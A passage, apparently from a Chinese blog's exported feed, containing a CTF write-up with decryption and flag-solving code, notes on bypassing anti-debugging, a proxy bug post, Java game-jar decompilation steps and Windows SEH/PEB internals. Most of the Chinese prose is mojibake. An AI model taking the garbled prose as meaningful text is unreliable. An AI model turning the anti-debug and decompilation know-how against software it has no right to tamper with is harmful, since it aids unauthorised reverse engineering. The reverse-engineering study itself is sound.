class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dectrueTEA</span><span class="params">(<span class="type">uint32_t</span>* flag, <span class="type">uint32_t</span>* key, <span class="type">uint32_t</span> E)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> delta[<span class="number">4</span>] = &#123; <span class="number">0x59578627</span> ,<span class="number">0xe1c49e72</span>,<span class="number">0xbc24167f</span> ,<span class="number">0x8c3da26b</span> &#125;;</span><br><span class="line"><span class="type">uint32_t</span> e = E;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> len = <span class="number">15</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span>) &#123;</span><br><span class="line"><span class="type">uint32_t</span>* c[<span class="number">4</span>] = &#123; &amp;flag[(len - (i + <span class="number">3</span>)) % len],&amp;flag[(len - (i + <span class="number">2</span>)) % len],&amp;flag[(len - (i + <span class="number">1</span>)) % len],&amp;flag[(len - i) % len] &#125;;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">32</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">*c[<span class="number">3</span>] -= ((e ^ *c[<span class="number">2</span>]) ^ (key[(j + <span class="number">3</span>) % <span class="number">4</span>] &gt;&gt; <span class="number">2</span>)) ^ (e &lt;&lt; <span class="number">1</span>);</span><br><span class="line">e -= delta[*c[<span class="number">3</span>] % <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">*c[<span class="number">2</span>] -= ((e ^ *c[<span class="number">1</span>]) ^ (key[(j + <span class="number">2</span>) % <span class="number">4</span>] &lt;&lt; <span class="number">3</span>)) ^ (e &gt;&gt; <span class="number">2</span>);</span><br><span class="line">e -= delta[*c[<span class="number">2</span>] % <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">*c[<span class="number">1</span>] -= ((e ^ *c[<span class="number">0</span>]) ^ (key[(j + <span class="number">1</span>) % <span class="number">4</span>] &gt;&gt; <span class="number">1</span>)) ^ (e &lt;&lt; <span class="number">4</span>);</span><br><span class="line">e -= delta[*c[<span class="number">1</span>] % <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">*c[<span class="number">0</span>] -= ((e ^ *c[<span class="number">3</span>]) ^ (key[j % <span class="number">4</span>] &lt;&lt; <span class="number">2</span>)) ^ (e &gt;&gt; <span class="number">3</span>);</span><br><span class="line">e -= delta[*c[<span class="number">0</span>] % <span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;\n0x%x 0x%x 0x%x 0x%x\n&quot;, *c[0], *c[1], *c[2], *c[3]);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> E = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint32_t</span> k1[<span class="number">4</span>] = &#123; <span class="number">0x1234</span>,<span class="number">0x2341</span>,<span class="number">0x3412</span>,<span class="number">0x4123</span> &#125;;</span><br><span class="line"><span class="type">uint32_t</span> a[] = &#123; <span class="number">0x127DC4E1</span>, <span class="number">0xCBA0EC0E</span>, <span class="number">0x570EDF5B</span>, <span class="number">0x99062A35</span>, <span class="number">0x382A7E1B</span>, <span class="number">0x15E46742</span>, <span class="number">0x4E5E456F</span>, <span class="number">0x3834C1D6</span>, <span class="number">0x5EF778A5</span>, <span class="number">0xAF217212</span>, <span class="number">0xC2D79D20</span>, <span class="number">0xD5C5935F</span>, <span class="number">0xCD2F5BB</span>, <span class="number">0xC527398C</span>, <span class="number">0x5EAC6739</span> &#125;;</span><br><span class="line">E = <span class="number">0xAE58570C</span>;</span><br><span class="line"><span class="built_in">dectrueTEA</span>(a, k1, E);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""></h3><h3 id="Debug">Debug</h3><p>dieçœ‹ä¸å‡ºæ¥å£³ï¼Œä½†æ˜¯idaå¯ä»¥ï¼Œæ‰€ä»¥ç”¨x64dbgåˆ°è„±å®Œå£³çš„åœ°æ–¹ï¼Œ</p><p>ä¸è¿‡å¾—å…ˆè°ƒè¯•ï¼Œç»“æœç”¨idaè°ƒè¯•ç›´æ¥å¯„åœ¨tlsçš„call raxé‡Œé¢ï¼Œç”¨x64dbgä¸€ç‚¹äº‹éƒ½æ²¡æœ‰ï¼Œç™¾æ€ä¸å¾—å…¶è§£ï¼Œæœ€åå‘ç°</p><p><img src="https://s2.loli.net/2024/05/29/lfk2bu7oR6UGThp.png" alt="image-20240529215820329"></p><p>tlsé‡Œé¢æœ‰ä¸ªåè°ƒè¯•ï¼Œåœ¨è§£å£³ä¹‹å‰ï¼Œæ‰€ä»¥å¾—å…ˆè·³è¿‡ï¼Œdbgé‡Œé¢è‡ªå¸¦çš„æ’ä»¶ç›´æ¥ç§’äº†ï¼Œæ‰€ä»¥dbgå°±æ²¡äº‹QAQ</p><p>è¿™ä¸ªæ„Ÿè§‰å¾ˆä¸é”™ï¼Œè¦æ˜¯æœ‰åŠæ³•åœ¨idaé‡Œé¢ç”¨å°±å¥½äº†</p><p>è®°å½•ä¸€ä¸‹ç”¨å·¥å…·ä¿®å¤iatè¡¨çš„è¿‡ç¨‹ï¼š</p><p>x64dbg æ’ä»¶ scylla</p><p><img src="https://s2.loli.net/2024/05/29/Q8fl1qEwGeXRmZx.png" alt="image-20240529205550754"></p><p>å»åè°ƒè¯•ï¼Œç„¶åæŠŠsmcæå‡ºæ¥ï¼Œç›´æ¥è§£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = [<span class="number">0xCF</span>, <span class="number">0xD9</span>, <span class="number">0xC0</span>, <span class="number">0xC8</span>, <span class="number">0xDF</span>, <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0xD2</span>, <span class="number">0x43</span>, <span class="number">0x98</span>, <span class="number">0x10</span>, <span class="number">0xC0</span>, <span class="number">0x83</span>, <span class="number">0x43</span>, <span class="number">0x9A</span>, <span class="number">0x10</span>, <span class="number">0xCD</span>, <span class="number">0x42</span>, <span class="number">0x8C</span>, <span class="number">0x4A</span>, <span class="number">0x10</span>, <span class="number">0xC8</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x4A</span>, <span class="number">0x9F</span>, <span class="number">0x8C</span>, <span class="number">0xDF</span>, <span class="number">0x98</span>, <span class="number">0x42</span>, <span class="number">0x8C</span>, <span class="number">0xDF</span>, <span class="number">0x84</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x46</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x52</span>,<span class="number">0xE</span>]</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">len</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        k = c</span><br><span class="line">        <span class="keyword">if</span> c &lt;=<span class="number">0x40</span> <span class="keyword">or</span> c&gt;=<span class="number">0x5b</span>:</span><br><span class="line">            <span class="keyword">if</span> c&lt;=<span class="number">0x60</span> <span class="keyword">or</span> c &gt;= <span class="number">0x7b</span>:</span><br><span class="line">                c-=<span class="number">30</span></span><br><span class="line">                c^=<span class="number">0x51</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                c-=<span class="number">32</span></span><br><span class="line">                c^=<span class="number">0xcd</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c+=<span class="number">32</span></span><br><span class="line">            c^=<span class="number">0xab</span></span><br><span class="line">        <span class="keyword">if</span> c==last[<span class="built_in">len</span>]:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(k)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#DRKCTF&#123;Y0u_Kn0w_F1a9_Con9raTu1aTion5!!!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ä¸€èµ·åšæ¯ä¸‹åˆèŒ¶å§">ä¸€èµ·åšæ¯ä¸‹åˆèŒ¶å§</h3><p>ä¸ä¼šQAQ</p><h2 id="Osint">Osint</h2><h3 id="ç¾¡æ…•ç¾¤å‹æ¯ä¸€å¤©">ç¾¡æ…•ç¾¤å‹æ¯ä¸€å¤©</h3><p>ç›´æ¥å¼€æœ</p><p><img src="https://s2.loli.net/2024/05/27/D9qgF3a4ZLxtCvP.png" alt="image-20240527145103522"></p><p>å‘ç°ä¸æ˜¯ä¸­é—´åœ†å¿ƒçš„ä½ç½®å¥½åƒä¸ä¸€æ ·</p><p>æ‰¾å¦ä¸€ä¸ª</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;ç¾å›½-å¼—ç½—é‡Œè¾¾å·-è¿ˆé˜¿å¯†-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;ç¾å›½-ä½›ç½—â¾¥è¾¾å·-è¿ˆé˜¿å¯†-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;ç¾å›½-ä½›ç½—é‡Œè¾¾å·-è¿ˆé˜¿å¯†-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;ç¾å›½-ä½›ç½—é‡Œè¾¾å·-è¿ˆé˜¿å¯†å·-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;ç¾å›½-ä½›ç½—é‡Œè¾¾å·-è¿ˆé˜¿å¯†å¸‚-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><p>ç¬¬äº”ä¸ªæ˜¯å¯¹çš„</p><h2 id="Misc">Misc</h2><h3 id="DNA-5">DNA -5</h3><p>æç¤ºï¼šé¥é¥é¢†å…ˆ</p><p>æŠ½è±¡çš„é¢˜ï¼Œæ²¡çœ‹wpä¹‹å‰æˆ‘ç»å¯¹æƒ³ä¸åˆ°QAQ</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ACGCTAATACCATCAACTCCATAACTCCCCACCTAAATCCAATAACCAGCTAAATCCAATAACCACTACCCCTCCATAAGAGAATAACCACTCATCCCCCTAATAAGAATAAACCTCCCCCAC</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®wpï¼Œç”±é¥é¥é¢†å…ˆæƒ³åˆ°5Gï¼Œåˆå› ä¸º-5ï¼Œæ‰€ä»¥å¯ä»¥æƒ³åˆ°è¦å°‘5ä¸ªG</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ACCTAATACCATCAACTCCATAACTCCCCACCTAAATCCAATAACCACTAAATCCAATAACCACTACCCCTCCATAAAAATAACCACTCATCCCCCTAATAAAATAAACCTCCCCCAC</span></span><br></pre></td></tr></table></figure><p>çœ‹è¿™ä¸ªå¯ä»¥å…ˆè¯•è¯•DNAè§£å¯†</p><p>ä¸è¡Œ</p><p>ç»“æœæ˜¯æ‘©æ–¯</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WIPXGU<span class="meta">%</span>u<span class="number">7</span>bSZ_SZ_<span class="number">1</span><span class="name">G5</span>_<span class="symbol">N0</span>IH<span class="number">3</span><span class="meta">%</span>u<span class="number">7</span>d</span><br><span class="line">WIPXGU&#123;SZ_SZ_<span class="number">1</span><span class="name">G5</span>_<span class="symbol">N0</span>IH<span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè§£atbash</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DRKCTF&#123;H<span class="built_in">A_HA</span>_1T5_M0RS3&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> cry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°å½•ä¸€æ¬¡ä¿®æ­£ç½‘ç»œbug</title>
      <link href="/posts/5afbca6a.html"/>
      <url>/posts/5afbca6a.html</url>
      
        <content type="html"><![CDATA[<p>ä¸çŸ¥é“æ˜¯ä»€ä¹ˆæ—¶å€™å¼€å§‹ï¼Œæˆ‘çš„æ¢¯å­å‡ºäº†ä¸€ä¸ªbugï¼ˆæˆ‘æ„Ÿè§‰æ˜¯å®‰äº†ideaç ´è§£æ’ä»¶ä¹‹åQAQï¼‰</p><p>é¦–å…ˆè¿™æ˜¯åŸºæœ¬ä¿¡æ¯ï¼š</p><p>æˆ‘æœ‰ä¸€ä¸ªæ¢¯å­ï¼ˆåŒä¸€ä¸ªå“ç‰Œï¼‰</p><p>ä¸€ä¸ªæ˜¯edgeæµè§ˆå™¨æ’ä»¶</p><p>ä¸€ä¸ªæ˜¯è½¯ä»¶</p><p>æ ¹æ®è¿™å‡ å¤©çš„è§‚å¯Ÿï¼Œå‡ºç°äº†ä»¥ä¸‹ç°è±¡ï¼š</p><ul><li>å¼€å¯æ’ä»¶è€Œå…³é—­è½¯ä»¶ï¼ˆä¸Šç½‘ç­–ç•¥+å…¨å±€ä»£ç†ï¼‰ï¼š<br>åªèƒ½è¿›å…¥cn.bing.comä¸”ç½‘é€Ÿå¾ˆæ…¢</li><li>å¼€å¯æ’ä»¶è€Œå…³é—­è½¯ä»¶ï¼ˆå…¨å±€ä»£ç†ï¼‰ï¼š<br>ç½‘é¡µæµè§ˆæ¢å¤æ­£å¸¸ï¼Œ<a href="http://xn--www-u28d42be8rwr7i.bing.com">å¯ä»¥è¿ä¸Šwww.bing.com</a>ï¼Œè¿‡ä¸€æ®µæ—¶é—´å˜æˆä¸å¯ä»¥è¿ä¸Šï¼Œå¹¶ä¸”ä¿®æ‰“å¼€å…³é—­ä¸Šç½‘ç­–ç•¥éƒ½ä¸è¡Œ</li><li>å¼€å¯è½¯ä»¶è€Œå…³é—­æ’ä»¶ï¼ˆå…¨å±€ä»£ç†ï¼‰ï¼š<br>ç½‘é¡µæµè§ˆæ¢å¤æ­£å¸¸ï¼Œ<a href="http://xn--www-u28d42be8rwr7i.bing.com">å¯ä»¥è¿ä¸Šwww.bing.com</a></li><li>ä¸¤ä¸ªéƒ½å¼€å¯ï¼š<br>åªèƒ½è¿›å…¥cn.bing.comä¸”ç½‘é€Ÿå¾ˆæ…¢</li><li>ä»¥å‰å¼€å¯æ’ä»¶è€Œå…³é—­è½¯ä»¶ï¼ˆä¸Šç½‘ç­–ç•¥+å…¨å±€ä»£ç†ï¼‰ï¼š<br><a href="http://xn--www-u28d42be8rwr7i.bing.com">å¯ä»¥è¿ä¸Šwww.bing.com</a></li><li>bingä¼šè§£æipåˆ¤æ–­æ˜¯è¿cnè¿˜æ˜¯www</li><li>æœ‰çš„æ—¶å€™é€šè¿‡pipå®‰è£…åŒ…ä¼šè®¿é—®é”™è¯¯ï¼ˆå›½å†…æºï¼‰ä½†æ˜¯å¼€å¯è½¯ä»¶å°±å¯ä»¥</li></ul><p><a href="http://xn--www-u28dl7mmcy3fmz7gul0aghdvypmtle27cgian7ax59d.bing.com">ç›®å‰é€šè¿‡å…³é—­ä¸Šç½‘ç­–ç•¥æ¥è¿›å…¥www.bing.com</a><br>å¤–é¢çš„bugä¹‹åå†ä¿®QAQ</p><p>çœ‹äº†ä¸€ä¸‹è®¾ç½®ï¼š<br>ä¸Šç½‘ç­–ç•¥ä¸­ä¼šæŠŠcn.bing.comç›´æ¥è¿æ¥ä¸ç»è¿‡æ¢¯å­</p>]]></content>
      
      
      <categories>
          
          <category> å®è·µ </category>
          
          <category> è®°å½• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>javaé€†å‘åŸºæœ¬æ­¥éª¤</title>
      <link href="/posts/c2aa3be6.html"/>
      <url>/posts/c2aa3be6.html</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©ç©æ€æˆ®å°–å¡”ï¼Œå¥½ç©ï¼Œæ‰€ä»¥è¯•äº†ä¸€ä¸‹è¦æ€ä¹ˆé€†ã€‚</p><p>è¿™ä¸ªæ¸¸æˆæ˜¯javaå†™çš„ï¼Œæ‰€ä»¥åŸºæœ¬é€»è¾‘å°±æ˜¯å…ˆæŠŠjaråŒ…åç¼–è¯‘æˆjavaæºæ–‡ä»¶ï¼Œç„¶åä¿®æ”¹ï¼Œç„¶åç”¨ideaç”Ÿæˆå‡ºjaråŒ…</p><p>è¿™ç¯‡åªæ˜¯è®°å½•ä¸€ä¸‹åŸºæœ¬æ­¥éª¤ï¼š</p><p>1.åç¼–è¯‘jar</p><p>è¿™é‡Œä½¿ç”¨çš„æ˜¯ideaçš„java-decompileræ’ä»¶ã€‚</p><p>ä¸‹è½½å¥½ä¹‹åæ‰¾åˆ°java-decompileræ’ä»¶çš„ä½ç½®ã€‚</p><p>å…ˆç”Ÿæˆä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå‡è®¾åå­—æ˜¯test</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp <span class="string">&quot;C:\decompiler.jar&quot;</span> org<span class="selector-class">.jetbrains</span><span class="selector-class">.java</span><span class="selector-class">.decompiler</span><span class="selector-class">.main</span><span class="selector-class">.decompiler</span><span class="selector-class">.ConsoleDecompiler</span> -dgs=true target<span class="selector-class">.jar</span> test</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp <span class="string">&quot;decomilerè·¯å¾„&quot;</span> org<span class="selector-class">.jetbrains</span><span class="selector-class">.java</span><span class="selector-class">.decompiler</span><span class="selector-class">.main</span><span class="selector-class">.decompiler</span><span class="selector-class">.ConsoleDecompiler</span> -dgs=true æºjarè·¯å¾„ ä¸€ä¸ªæ–‡ä»¶å¤¹å</span><br></pre></td></tr></table></figure><p>å¦‚æœæ­£ç¡®ï¼Œæ–‡ä»¶å¤¹é‡Œä¼šç”Ÿæˆä¸€ä¸ªå’ŒåˆšåˆšåŒåçš„jarã€‚è§£å‹ä¹‹åå¾—åˆ°æºä»£ç ã€‚</p><p>2.è°ƒæ•´ç›®å½•ç»“æ„</p><p>ç”±äºè§£å‹åæ‰€æœ‰å†…å®¹éƒ½æ˜¯å¹³é“ºçš„ï¼Œéœ€è¦è°ƒæ•´ç›®å½•ç»“æ„è®©ideaå¯ä»¥æ­£ç¡®è¯†åˆ«å¹¶ç”Ÿæˆï¼ŒåŒæ—¶ç”±äºæˆ‘é€†çš„æ˜¯æ¸¸æˆæ¨¡ç»„ï¼Œæ‰€ä»¥è¿˜éœ€è¦å¯¼å…¥å¯¹åº”çš„æ¸¸æˆä¾èµ–åŒ…ã€‚</p><p>ç›®å½•ç»“æ„åº”è¯¥æ˜¯ï¼š</p><p>test</p><ul><li>src<ul><li>main<ul><li>java<ul><li>æºä»£ç </li></ul></li><li>resources<ul><li>img</li><li>localization</li></ul></li></ul></li></ul></li></ul><p>ç”Ÿæˆjar</p><p>ä¸æ˜¯å¾ˆæ‡‚mavenï¼Œå¥½åƒæ˜¯ä¸€ä¸ªç®¡ç†å™¨ä¸€æ ·çš„ä¸œè¥¿ï¼Œè¿™ä¸ªåœ°æ–¹æˆ‘ç”¨å®ƒæ¥ç”Ÿæˆjarä»£ç </p><p>è¯¦è§ï¼š<a href="https://zhuanlan.zhihu.com/p/403468512">æ€æˆ®å°–å¡”MODåˆ¶ä½œè¯¦è§£</a></p><p>é¦–å…ˆæ„å»ºpom.xml</p><p>åœ¨é‡Œé¢å¡«å†™å¯¹åº”çš„é…ç½®é¡¹</p><p>ç„¶ååœ¨å³è¾¹é€‰æ‹©package</p><p>å®ƒä¼šè‡ªåŠ¨ç”Ÿæˆï¼Œå¦‚æœåç¼–è¯‘çš„æ–‡ä»¶æœ‰é—®é¢˜ï¼Œå°±æ‰‹åŠ¨ä¿®æ­£ä¸€ä¸‹ï¼ˆæˆ‘åªé‡åˆ°äº†ä¸€ä¸ªï¼‰</p><p>ç„¶åå°±èƒ½ç”Ÿæˆå¯¹åº”çš„jaræ–‡ä»¶äº†ã€‚</p><hr><p>ä¸€å®šè¦æ³¨æ„æ–‡ä»¶è·¯å¾„è¦æ­£ç¡®ï¼Œä¸ç„¶åªèƒ½ç”Ÿæˆåªæœ‰å…ƒæ•°æ®çš„æ–‡ä»¶ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> å®è·µ </category>
          
          <category> é€†å‘ </category>
          
          <category> è¯­è¨€ </category>
          
          <category> è®°å½• </category>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>seh-windowsç»“æ„åŒ–å¼‚å¸¸å¤„ç†ç ”ç©¶</title>
      <link href="/posts/8c61c980.html"/>
      <url>/posts/8c61c980.html</url>
      
        <content type="html"><![CDATA[<p>SEHç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼š<br>æœ¬ç¯‡å»ºè®®å’ŒWindowsè°ƒè¯•åŸç†ä¸€èµ·çœ‹</p><p>ç”±äºè¿™ä¸ªä¸œè¥¿æ˜¯åŸºäºçº¿ç¨‹çš„ï¼Œæ‰€ä»¥å…ˆå­¦ä¹ ä¸€ä¸‹PEBå’ŒTEB</p><h2 id="TEB-PEB">TEB&amp;PEB</h2><p>çº¿ç¨‹ç¯å¢ƒå—</p><p>ç³»ç»Ÿåœ¨TEBä¸­ä¿å­˜äº†æœ€é¢‘ç¹ä½¿ç”¨çš„çº¿ç¨‹ç›¸å…³æ•°æ®ï¼Œå¤§å°ä¸º4kbã€‚ç³»ç»Ÿä¸­æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„TEBï¼Œä¸€ä¸ªè¿›ç¨‹çš„æ‰€æœ‰TEBéƒ½ä»¥å †æ ˆçš„å½¢å¼å­˜æ”¾åœ¨å†…å­˜ä¸­ã€‚åŒç†ï¼ŒPEBä¸ºè¿›ç¨‹ç¯å¢ƒå—ï¼ŒTEBä¸­æœ‰æŒ‡å‘PEBçš„æŒ‡é’ˆï¼Œæ¯ä¸ªè¿›ç¨‹çš„PEBä¹Ÿä»¥å †æ ˆå½¢å¼æ”¾åœ¨å†…å­˜ä¸­</p><ul><li>åœ¨x64æ¶æ„ç¯å¢ƒä¸‹ï¼Œ<code>GS + 30h</code>å¤„å­˜å‚¨çš„æ˜¯Tebç»“æ„ä½“çš„åŸºåœ°å€ï¼Œ<code>GS + 60h</code>å¤„å­˜å‚¨çš„æ˜¯Pebç»“æ„ä½“çš„åŸºåœ°å€ã€‚</li><li>åœ¨x86æ¶æ„ç¯å¢ƒä¸‹ï¼Œ<code>FS + 18h</code>å¤„å­˜å‚¨çš„æ˜¯Tebç»“æ„ä½“çš„åŸºåœ°å€ï¼Œ<code>FS + 30h</code>å¤„å­˜å‚¨çš„æ˜¯Pebç»“æ„ä½“çš„åŸºåœ°å€ã€‚</li></ul><p>è€ŒæŒ‡å‘SEHé“¾å¼€å¤´å°±æ˜¯TEBçš„0å·ä½<br>ä»¥ä¸‹æ˜¯TEBä¸sehçš„å…³ç³»<br><img src="https://s2.loli.net/2024/05/04/GBMrJPKWZhiuNL2.png" alt="867232_UQX698BZWQ7UZ8Y"></p><h3 id="TEBé‡è¦æˆå‘˜">TEBé‡è¦æˆå‘˜</h3><ul><li>åç§»0çš„NtTibçº¿ç¨‹ä¿¡æ¯å—ï¼Œå«æœ‰ExceptionList</li><li>åç§»0x30çš„ProcessEnvironmentBlockæŒ‡å‘PEBï¼Œå³è¿›ç¨‹ç¯å¢ƒå—</li></ul><p>è®¿é—®TEB ï¼šNtCurrentTeb()æˆ–è€…æŒ‰ä¸Šé¢çš„æ–¹æ³•ç›´æ¥å–æ®µå¯„å­˜å™¨</p><h2 id="PEBé‡è¦æˆå‘˜">PEBé‡è¦æˆå‘˜</h2><p>pebè¢«tebåç§»0x30çš„æŒ‡é’ˆæŒ‡å‘ã€‚</p><ul><li>åç§»2çš„BeingDebuggedæ ‡å¿—</li><li>åç§»8çš„ImageBaseAddress</li><li>åç§»cçš„Ldrï¼Œä¿å­˜åŠ è½½æ¨¡å—çš„é“¾è¡¨</li><li>åç§»0x18çš„ProcessHeapï¼Œå¯ç”¨äºåè°ƒè¯•</li><li>åç§»0x68çš„NtGlobalFlagï¼Œå¯ç”¨äºåè°ƒè¯•</li></ul><p>ImageBaseAddressè¡¨ç¤ºè¿›ç¨‹çš„ImageBaseï¼Œå¯ä»¥ç”¨GetModuleHandle(lpModuleName)è·å–</p><p>Ldræ˜¯ä¸€ä¸ªç»“æ„ä½“</p><p>visual studioä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span> &#123;</span></span><br><span class="line">    BYTE Reserved1[<span class="number">8</span>];</span><br><span class="line">    PVOID Reserved2[<span class="number">3</span>];</span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;<span class="comment">//x86åç§»0x14,x64åç§»0x20</span></span><br><span class="line">&#125; PEB_LDR_DATA, *PPEB_LDR_DATA;</span><br></pre></td></tr></table></figure><p>å®é™…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">ã€€ULONG Length; <span class="comment">// +0x00</span></span><br><span class="line">ã€€BOOLEAN Initialized; <span class="comment">// +0x04</span></span><br><span class="line">ã€€PVOID SsHandle; <span class="comment">// +0x08å†…å­˜å¯¹é½</span></span><br><span class="line">ã€€LIST_ENTRY InLoadOrderModuleList; <span class="comment">// +0x0c</span></span><br><span class="line">ã€€LIST_ENTRY InMemoryOrderModuleList; <span class="comment">// +0x14</span></span><br><span class="line">ã€€LIST_ENTRY InInitializationOrderModuleList;<span class="comment">// +0x1c</span></span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; <span class="comment">// +0x24</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span 